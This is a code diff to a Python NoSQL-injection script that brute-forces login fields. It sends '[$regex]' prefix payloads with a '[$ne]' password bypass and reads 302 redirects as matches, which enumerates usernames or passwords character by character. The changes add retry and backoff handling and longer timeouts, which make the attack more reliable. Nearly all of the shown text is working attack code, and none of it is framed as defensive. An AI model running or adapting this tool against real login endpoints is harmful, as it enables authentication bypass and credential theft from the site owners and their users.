@@ -4,6 +4,8 @@ import requests
 import argparse
 import sys
 from colorama import Fore
+from urllib3.util import Retry
+from requests.adapters import HTTPAdapter
 
 def get_arguments():
     parser = argparse.ArgumentParser(description="Script to enumerate a parameter using regex injection.")
@@ -47,12 +49,20 @@ def main():
 
     payloads = build_payloads(characters)
 
+    # Create a Retry object with backoff factor and maximum retries
+    retry = Retry(total=5, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
+
+    # Create a session and attach the Retry object to it
+    session = requests.Session()
+    adapter = HTTPAdapter(max_retries=retry)
+    session.mount('http://', adapter)
+
     for payload in payloads:
         para = {enum_parameter + '[$regex]': "^" + payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
 
         try:
-            r = method(url, data=para, allow_redirects=False, timeout=5)  # Set a timeout in seconds
-            r.raise_for_status()  # Check if the request was successful (status code in the 2xx range)
+            r = session.request(method, url, data=para, allow_redirects=False, timeout=10)  # Increased timeout to 10 seconds
+            r.raise_for_status()
 
             if r.status_code == 302:
                 loop = True
@@ -65,8 +75,8 @@ def main():
                         para = {enum_parameter + '[$regex]': "^" + new_payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
 
                         try:
-                            r = method(url, data=para, timeout=5)  # Set a timeout in seconds
-                            r.raise_for_status()  # Check if the request was successful (status code in the 2xx range)
+                            r = session.request(method, url, data=para, timeout=10)  # Increased timeout to 10 seconds
+                            r.raise_for_status()
 
                             if r.status_code == 302:
                                 print(Fore.YELLOW + f"Pattern found: {new_payload}")
